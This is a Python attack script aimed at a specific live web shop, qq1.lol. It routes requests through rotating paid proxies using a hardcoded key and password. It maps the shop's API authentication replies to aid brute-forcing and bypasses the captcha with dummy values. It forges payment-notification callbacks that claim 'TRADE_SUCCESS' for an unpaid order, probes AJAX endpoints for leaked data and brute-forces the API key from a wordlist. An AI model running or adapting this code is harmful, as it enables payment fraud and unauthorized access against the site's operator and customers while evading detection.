#!/usr/bin/env python3
"""qq1 deep7 remote — run on China jump with QG area rotate."""
import hashlib
import json
import re
import subprocess
import time
import urllib.parse
from datetime import datetime
from pathlib import Path

BASE = "https://qq1.lol"
OUT = Path("/tmp/qq1_deep7")
OUT.mkdir(exist_ok=True)
LOG = OUT / "deep7.log"
HITS = OUT / "deep7_hits.jsonl"
REPORT = OUT / "deep7_report.json"
QG_KEY, QG_PWD = "C413ED6D", "344F550A6F8B"
JAR = str(OUT / "cookies.jar")
_px = None
_px_fail = 0
report = {"ts": datetime.now().isoformat(), "findings": [], "tests": [], "pay_extract": {}}


def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    print(line, flush=True)
    open(LOG, "a").write(line + "\n")


def hit(kind, detail, body=""):
    rec = {"kind": kind, "detail": detail, "body": (body or "")[:8000]}
    open(HITS, "a").write(json.dumps(rec, ensure_ascii=False) + "\n")
    report["findings"].append(rec)
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:300]}")


def get_proxy(force=False):
    global _px, _px_fail
    if _px and not force and _px_fail < 3:
        return _px
    for area in ["440000", "0", "330000", "320000", "350000", "370000", "510000"]:
        try:
            raw = subprocess.check_output(
                ["curl", "-s", "--max-time", "10",
                 f"https://share.proxy.qg.net/get?key={QG_KEY}&num=1&area={area}"],
                text=True, timeout=12,
            )
            d = json.loads(raw)
            if d.get("code") == "SUCCESS" and d.get("data"):
                srv = d["data"][0]["server"]
                # smoke test
                code = subprocess.run(
                    ["curl", "-sk", "--max-time", "10",
                     "-x", f"http://{QG_KEY}:{QG_PWD}@{srv}",
                     "-o", "/dev/null", "-w", "%{http_code}",
                     f"{BASE}/%61pi.php?act=siteinfo"],
                    capture_output=True, text=True, timeout=15,
                ).stdout.strip()
                if code == "200":
                    _px = f"http://{QG_KEY}:{QG_PWD}@{srv}"
                    _px_fail = 0
                    log(f"proxy ok area={area} {srv}")
                    return _px
                log(f"proxy bad area={area} {srv} code={code}")
        except Exception as e:
            log(f"proxy err area={area}: {e}")
        time.sleep(0.5)
    _px = None
    return None


def curl(url, post=None, mt=18):
    global _px_fail
    px = get_proxy()
    if not px:
        return "", "000"
    cmd = [
        "curl", "-sk", "--max-time", str(mt), "-x", px, "-b", JAR, "-c", JAR,
        "-A", "Mozilla/5.0",
        "-H", "Referer: https://qq1.lol/",
        "-H", "X-Requested-With: XMLHttpRequest",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-w", "\n__HTTP:%{http_code}",
    ]
    if post is not None:
        body = urllib.parse.urlencode(post) if isinstance(post, dict) else str(post)
        cmd += ["-X", "POST", "-d", body]
    cmd.append(url)
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=mt + 5).stdout or ""
    except Exception as e:
        _px_fail += 1
        return str(e), "000"
    if "__HTTP:" not in out:
        _px_fail += 1
        get_proxy(True)
        return out.strip(), "000"
    body, code = out.rsplit("__HTTP:", 1)
    code = code.strip()
    if code in ("000", "408", "502", "503"):
        _px_fail += 1
        if _px_fail >= 2:
            get_proxy(True)
    return body.strip(), code


def rec(name, body, code=""):
    report["tests"].append({"name": name, "code": code, "body": (body or "")[:600]})
    log(f"  {name}: HTTP={code} {(body or '')[:180]}")


def auth_map():
    log("=== AUTH MAP ===")
    tests = [
        ("change_GET_all", f"{BASE}/%61pi.php?act=change&id=25949&zt=1&key=test", None),
        ("change_GET_idzt_POST_key", f"{BASE}/%61pi.php?act=change&id=25949&zt=1", {"key": "test"}),
        ("change_GET_idzt_POST_wrong", f"{BASE}/%61pi.php?act=change&id=25949&zt=1", {"key": "wrong_long_key_999"}),
        ("change_GET_id_POST_ztkey", f"{BASE}/%61pi.php?act=change&id=25949", {"zt": "1", "key": "test"}),
        ("change_POST_all", f"{BASE}/%61pi.php?act=change", {"id": "25949", "zt": "1", "key": "test"}),
        ("change_zt2_POST_key", f"{BASE}/%61pi.php?act=change&id=25949&zt=2", {"key": "test"}),
        ("change_zt3_POST_key", f"{BASE}/%61pi.php?act=change&id=25949&zt=3", {"key": "test"}),
        ("change_zt4_POST_key", f"{BASE}/%61pi.php?act=change&id=25949&zt=4", {"key": "test"}),
        ("tools_GET", f"{BASE}/%61pi.php?act=tools&key=test&limit=1", None),
        ("tools_POST", f"{BASE}/%61pi.php?act=tools", {"key": "test", "limit": "1"}),
        ("orders_GET", f"{BASE}/%61pi.php?act=orders&key=test&limit=1&tid=102", None),
        ("orders_POST", f"{BASE}/%61pi.php?act=orders", {"key": "test", "limit": "1", "tid": "102"}),
        ("orders_sign", f"{BASE}/%61pi.php?act=orders&key=test&sign=1&limit=1&tid=102", None),
        ("search_GET", f"{BASE}/%61pi.php?act=search&id=25949&key=test", None),
        ("search_POST", f"{BASE}/%61pi.php?act=search", {"id": "25949", "key": "test"}),
        ("clone_GET", f"{BASE}/%61pi.php?act=clone&key=test", None),
        ("token_GET", f"{BASE}/%61pi.php?act=token&key=test", None),
        ("siteinfo", f"{BASE}/%61pi.php?act=siteinfo", None),
        ("classlist", f"{BASE}/%61pi.php?act=classlist", None),
        ("goodslist_POST", f"{BASE}/%61pi.php?act=goodslist", {}),
        ("goodsdetails_POST", f"{BASE}/%61pi.php?act=goodsdetails", {"tid": "102"}),
        ("getleftcount_POST", f"{BASE}/%61pi.php?act=getleftcount", {"tid": "102"}),
    ]
    for name, url, post in tests:
        body, code = curl(url, post)
        rec(name, body, code)
        # Detect wrong-key vs needauth difference — critical for brute
        if "密钥错误" in (body or ""):
            report.setdefault("signals", {})[name] = "WRONG_KEY"
        elif "请提供" in (body or ""):
            report.setdefault("signals", {})[name] = "NEED_AUTH"
        elif "不合法" in (body or ""):
            report.setdefault("signals", {})[name] = "INVALID_ZT"
        elif "不能为空" in (body or ""):
            report.setdefault("signals", {})[name] = "EMPTY_FIELD"
        time.sleep(0.35)


def pay_capture():
    log("=== PAY CAPTURE ===")
    Path(JAR).unlink(missing_ok=True)
    get_proxy(True)
    curl(f"{BASE}/")
    buy, _ = curl(f"{BASE}/?mod=buy&cid=4&tid=102")
    for _ in range(4):
        if buy and "hashsalt" in (buy or ""):
            break
        get_proxy(True)
        buy, _ = curl(f"{BASE}/?mod=buy&cid=4&tid=102")
        time.sleep(1)
    csrf = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', buy or "")
    hs_m = re.search(r"var hashsalt=(.+);", buy or "")
    if not csrf or not hs_m:
        log("no buy tokens; buy len=%s" % len(buy or ""))
        (OUT / "buy.html").write_text(buy or "", errors="replace")
        return None
    # evaluate hashsalt with node if present else python fallback
    try:
        hs = subprocess.run(
            ["node", "-e", f"var hashsalt={hs_m.group(1)}; console.log(hashsalt)"],
            capture_output=True, text=True, timeout=8,
        ).stdout.strip()
    except Exception:
        hs = hs_m.group(1).strip().strip("'\"")
    pay, _ = curl(f"{BASE}/ajax.php?act=pay", {
        "tid": "102", "num": "1", "inputvalue": "deep7pay",
        "csrf_token": csrf.group(1), "hashsalt": hs,
        "geetest_challenge": "1", "geetest_validate": "1", "geetest_seccode": "1|jordan",
    })
    rec("ajax_pay", pay)
    tn_m = re.search(r'"trade_no"\s*:\s*"(\d+)"', pay or "")
    tn = tn_m.group(1) if tn_m else None
    report["trade_no"] = tn
    log(f"trade_no={tn}")
    if not tn:
        return None

    for typ in ["alipay", "wxpay", "qqpay", "usdt"]:
        sub, code = curl(f"{BASE}/other/submit.php?type={typ}&orderid={tn}")
        rec(f"submit_{typ}", (sub or "")[:1000], code)
        (OUT / f"submit_{typ}.html").write_text(sub or "", errors="replace")
        if sub:
            pids = re.findall(r'name=["\']pid["\'][^>]*value=["\']([^"\']+)', sub, re.I)
            pids += re.findall(r'[?&]pid=([0-9]+)', sub)
            actions = re.findall(r'action=["\']([^"\']+)', sub, re.I)
            urls = re.findall(r'https?://[a-zA-Z0-9._/-]+', sub)
            money = re.findall(r'name=["\']money["\'][^>]*value=["\']([^"\']+)', sub, re.I)
            report["pay_extract"][typ] = {
                "pids": pids[:10], "actions": actions[:10],
                "urls": list(dict.fromkeys(urls))[:20], "money": money[:5],
                "len": len(sub),
            }
            log(f"  {typ} pids={pids[:3]} actions={actions[:2]} urls={urls[:5]}")
        time.sleep(0.4)

    # notify attempts
    log("--- notify ---")
    paths = [
        f"{BASE}/other/notify.php",
        f"{BASE}/other/notify.php?type=alipay",
        f"{BASE}/ajax.php?act=notify",
    ]
    for path in paths:
        for post in [
            {"out_trade_no": tn, "trade_no": "EPAY" + tn, "trade_status": "TRADE_SUCCESS",
             "money": "1.00", "pid": "1000", "type": "alipay", "sign": "test", "name": "x"},
            {"out_trade_no": tn, "trade_status": "TRADE_SUCCESS", "sign": hashlib.md5(tn.encode()).hexdigest()},
        ]:
            body, code = curl(path, post)
            rec(f"notify {path.split('.lol')[1]}", body, code)
            low = (body or "").lower()
            if body and any(x in low for x in ["success", "ok"]) and "fail" not in low and "签名" not in (body or "") and "错误" not in (body or ""):
                hit("notify", path, body)
            time.sleep(0.3)
    return tn


def ajax_leaks():
    log("=== AJAX LEAKS ===")
    for act, post in [
        ("getcount", None),
        ("getconfig", {}),
        ("siteinfo", {}),
        ("getmoney", {}),
        ("getuser", {}),
        ("orderlist", {}),
        ("getorder", {"id": "25949"}),
        ("getshareid", {"id": "1"}),
        ("gift_start", {}),
        ("cart_list", {}),
        ("checklogin", {}),
    ]:
        url = f"{BASE}/ajax.php?act={act}"
        body, code = curl(url, post if post is not None else None)
        # getcount often needs GET
        if act == "getcount":
            body, code = curl(url)
        rec(f"ajax_{act}", body, code)
        if body and act in ("getconfig", "getmoney", "getuser", "orderlist", "getorder") and '"code":0' in body:
            hit("ajax_leak", act, body)
        time.sleep(0.3)


def tools_burst():
    log("=== TOOLS BURST ===")
    base = [
        "buyi", "buyiq", "qqkqq", "qq1", "QQKZC", "ka1", "faka", "apikey", "token",
        "secret", "12345678", "qwerty", "by123456", "by888888", "20251101", "2025-11-01",
        "ds_shop", "mckuai", "布衣", "发卡", "telegram", "t.me", "qqkzc",
    ]
    keys = []
    for w in base:
        for s in ["", "123", "888", "666", "2024", "2025", "2026", "!", "@", "key", "api", "001"]:
            keys += [w + s, (w + s).upper()]
        keys.append(hashlib.md5(w.encode()).hexdigest())
    seen = set()
    uniq = [k for k in keys if k not in seen and not seen.add(k)]
    log(f"burst n={len(uniq)}")
    for i, k in enumerate(uniq):
        body, _ = curl(f"{BASE}/%61pi.php?act=tools&key={urllib.parse.quote(k)}&limit=2")
        if not body:
            continue
        if "密钥错误" in body or "确保各项" in body:
            pass
        elif body.startswith("[") or ('"tid"' in body and "错误" not in body):
            hit("TOOLS_KEY", k, body)
            (OUT / "TOOLS_KEY_HIT.txt").write_text(k + "\n" + body[:5000])
            break
        elif "请提供" not in body and "<html" not in body.lower()[:40]:
            log(f"unusual {k!r}: {body[:100]}")
        if i and i % 40 == 0:
            log(f"burst {i}/{len(uniq)}")
            get_proxy(True)
        time.sleep(0.1)
    report["tools_burst"] = len(uniq)


def main():
    open(LOG, "w").write("")
    log("=== DEEP7 REMOTE START ===")
    auth_map()
    tn = pay_capture()
    ajax_leaks()
    tools_burst()
    REPORT.write_text(json.dumps(report, ensure_ascii=False, indent=2))
    log(f"=== DONE findings={len(report['findings'])} signals={report.get('signals')} ===")
    print("REPORT_WRITTEN", REPORT)


if __name__ == "__main__":
    main()
